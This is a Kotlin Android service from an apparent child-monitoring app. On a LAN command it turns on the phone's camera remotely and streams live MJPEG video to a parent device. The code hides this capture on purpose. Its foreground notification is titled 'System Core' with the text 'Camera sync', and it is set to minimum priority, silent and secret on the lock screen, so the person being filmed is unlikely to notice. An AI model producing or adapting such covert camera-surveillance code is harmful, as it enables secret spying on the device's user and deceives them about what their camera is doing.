package com.vyra.kids.services

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.vyra.kids.core.AppConstants
import com.vyra.kids.core.CameraFrameBuffer

/**
 * RemoteCameraStreamService — Full Camera2 live MJPEG streaming service.
 *
 * Uses Camera2 ImageReader (JPEG, 640x480) in a continuous repeating capture session.
 * Each JPEG frame is stored into CameraFrameBuffer singleton which LocalLanSyncServer
 * reads to serve /api/camera-frame (single snapshot) and /api/camera-mjpeg (live MJPEG stream).
 *
 * Architecture:
 *   Parent taps "Live Camera" → parent sends LAN command → child starts this service
 *   → Camera2 opens + fills CameraFrameBuffer → LAN server streams MJPEG to parent at ~15 FPS
 */
class RemoteCameraStreamService : Service() {

    private var cameraManager: CameraManager? = null
    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private var cameraThread: HandlerThread? = null
    private var cameraHandler: Handler? = null

    private var isTorchOn = false
    private var currentFacing = "back"

    companion object {
        const val ACTION_START_CAMERA = "com.vyra.kids.START_CAMERA"
        const val ACTION_STOP_CAMERA  = "com.vyra.kids.STOP_CAMERA"
        const val ACTION_SWITCH_CAMERA = "com.vyra.kids.SWITCH_CAMERA"
        const val ACTION_TOGGLE_TORCH  = "com.vyra.kids.TOGGLE_TORCH"
        const val EXTRA_CAMERA_FACING  = "camera_facing"  // "front" or "back"

        // MJPEG target resolution — 640×480 gives ~15 FPS smooth at low bandwidth
        private const val FRAME_WIDTH  = 640
        private const val FRAME_HEIGHT = 480
    }

    // ─────────────────────────────────────────────────────────────────────────────
    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        cameraThread  = HandlerThread("VyraCameraThread").also { it.start() }
        cameraHandler = Handler(cameraThread!!.looper)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START_CAMERA -> {
                startForegroundCompat()
                currentFacing = intent.getStringExtra(EXTRA_CAMERA_FACING) ?: "back"
                openCamera(currentFacing)
            }
            ACTION_STOP_CAMERA -> {
                closeCamera()
                stopSelf()
            }
            ACTION_SWITCH_CAMERA -> {
                val newFacing = intent.getStringExtra(EXTRA_CAMERA_FACING) ?: "back"
                if (newFacing != currentFacing) {
                    currentFacing = newFacing
                    closeCamera()
                    openCamera(currentFacing)
                }
            }
            ACTION_TOGGLE_TORCH -> toggleFlashlight()
        }
        return START_NOT_STICKY
    }

    // ─────────────────────────── Foreground Notification ─────────────────────────

    private fun startForegroundCompat() {
        val channelId = "vyra_camera_streaming"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(channelId, "System Core", NotificationManager.IMPORTANCE_MIN).apply {
                setShowBadge(false); setSound(null, null)
                enableLights(false); enableVibration(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(ch)
        }
        val notif = NotificationCompat.Builder(this, channelId)
            .setContentTitle("System Core").setContentText("Camera sync")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true).setShowWhen(false).setOngoing(true).build()

        when {
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.R ->
                startForeground(AppConstants.SERVICE_NOTIFICATION_ID + 2, notif,
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE)
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q ->
                startForeground(AppConstants.SERVICE_NOTIFICATION_ID + 2, notif,
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
            else -> startForeground(AppConstants.SERVICE_NOTIFICATION_ID + 2, notif)
        }
    }

    // ────────────────────────────── Camera2 Core ──────────────────────────────────

    @SuppressLint("MissingPermission")
    private fun openCamera(facing: String) {
        try {
            val cameraId = findCameraId(facing) ?: run {
                Log.e(AppConstants.TAG, "No camera found for facing: $facing"); return
            }

            // ImageReader: JPEG 640×480, max 3 buffers (latest always fresh)
            imageReader = ImageReader.newInstance(FRAME_WIDTH, FRAME_HEIGHT, ImageFormat.JPEG, 3)
            imageReader!!.setOnImageAvailableListener({ reader ->
                val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                try {
                    val buf = image.planes[0].buffer
                    val bytes = ByteArray(buf.remaining())
                    buf.get(bytes)
                    CameraFrameBuffer.putFrame(bytes)    // push to shared buffer
                } finally {
                    image.close()
                }
            }, cameraHandler)

            cameraManager!!.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    createCaptureSession(camera)
                    CameraFrameBuffer.isActive = true
                    Log.i(AppConstants.TAG, "Camera2 opened [$facing] → streaming ${FRAME_WIDTH}x${FRAME_HEIGHT} JPEG")
                }
                override fun onDisconnected(camera: CameraDevice) {
                    camera.close(); cameraDevice = null
                    CameraFrameBuffer.isActive = false
                }
                override fun onError(camera: CameraDevice, error: Int) {
                    camera.close(); cameraDevice = null
                    CameraFrameBuffer.isActive = false
                    Log.e(AppConstants.TAG, "Camera2 error: $error")
                }
            }, cameraHandler)
        } catch (e: Exception) {
            Log.e(AppConstants.TAG, "openCamera failed", e)
        }
    }

    private fun createCaptureSession(camera: CameraDevice) {
        try {
            val surfaces = listOf(imageReader!!.surface)
            camera.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
                override fun onConfigured(session: CameraCaptureSession) {
                    captureSession = session
                    try {
                        val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
                            addTarget(imageReader!!.surface)
                            set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                            set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                            set(CaptureRequest.JPEG_QUALITY, 75.toByte()) // 75% JPEG = good quality + low bandwidth
                        }.build()
                        session.setRepeatingRequest(req, null, cameraHandler)
                        Log.i(AppConstants.TAG, "Camera2 repeating capture session ACTIVE → MJPEG ready on LAN")
                    } catch (e: Exception) {
                        Log.e(AppConstants.TAG, "Capture request failed", e)
                    }
                }
                override fun onConfigureFailed(session: CameraCaptureSession) {
                    Log.e(AppConstants.TAG, "Camera2 session configure FAILED")
                }
            }, cameraHandler)
        } catch (e: Exception) {
            Log.e(AppConstants.TAG, "createCaptureSession failed", e)
        }
    }

    private fun findCameraId(facing: String): String? {
        val target = if (facing == "front") CameraCharacteristics.LENS_FACING_FRONT
                     else CameraCharacteristics.LENS_FACING_BACK
        return cameraManager?.cameraIdList?.firstOrNull { id ->
            cameraManager?.getCameraCharacteristics(id)
                ?.get(CameraCharacteristics.LENS_FACING) == target
        }
    }

    private fun toggleFlashlight() {
        try {
            val backId = findCameraId("back") ?: return
            isTorchOn = !isTorchOn
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                cameraManager?.setTorchMode(backId, isTorchOn)
                Log.i(AppConstants.TAG, "Flashlight: $isTorchOn")
            }
        } catch (e: CameraAccessException) {
            Log.e(AppConstants.TAG, "toggleFlashlight error", e)
        }
    }

    private fun closeCamera() {
        try {
            CameraFrameBuffer.isActive = false
            CameraFrameBuffer.clear()
            captureSession?.close();  captureSession = null
            cameraDevice?.close();    cameraDevice = null
            imageReader?.close();     imageReader = null
            Log.i(AppConstants.TAG, "Camera2 closed cleanly")
        } catch (e: Exception) {
            Log.e(AppConstants.TAG, "closeCamera error", e)
        }
    }

    // ─────────────────────────────────────────────────────────────────────────────
    override fun onDestroy() {
        if (isTorchOn) toggleFlashlight()
        closeCamera()
        cameraThread?.quitSafely()
        super.onDestroy()
    }
}
